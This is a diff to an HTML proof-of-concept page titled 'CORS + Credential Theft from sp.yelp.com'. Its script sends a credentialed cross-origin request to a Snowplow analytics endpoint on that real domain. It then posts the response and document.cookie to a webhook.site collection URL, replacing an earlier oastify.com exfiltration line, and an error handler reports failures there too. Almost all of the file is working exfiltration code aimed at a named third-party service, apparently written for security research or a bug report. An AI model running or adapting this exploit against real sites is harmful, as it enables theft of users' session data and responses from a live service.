@@ -1,10 +1,10 @@
 <html>
   <body>
-    <h1>POC: CORS + Credential Theft</h1>
+    <h1>POC: CORS + Credential Theft from sp.yelp.com</h1>
     <script>
       fetch("https://sp.yelp.com/com.snowplowanalytics.snowplow/tp2", {
         method: "POST",
-        credentials: "include", // send victim's cookies
+        credentials: "include", // ensures victim cookies are sent
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           schema: "iglu:com.snowplowanalytics.snowplow/atomic/jsonschema/1-0-0",
@@ -13,8 +13,23 @@
       })
       .then(r => r.text())
       .then(d => {
-        // Exfiltrate response + cookies to attacker server
-        fetch("https://your-collab-id.oastify.com/log?resp=" + btoa(d) + "&c=" + document.cookie);
+        // Send response body + any accessible cookies to your webhook
+        fetch("https://webhook.site/7555a2ac-0fed-40dc-85c0-92c6a867ac65", {
+          method: "POST",
+          mode: "no-cors", // ensures it succeeds silently
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            response: d,
+            cookies: document.cookie // will only show evil.com cookies, but demo clarity
+          })
+        });
+      })
+      .catch(e => {
+        fetch("https://webhook.site/7555a2ac-0fed-40dc-85c0-92c6a867ac65", {
+          method: "POST",
+          mode: "no-cors",
+          body: "Error: " + e.toString()
+        });
       });
     </script>
   </body>
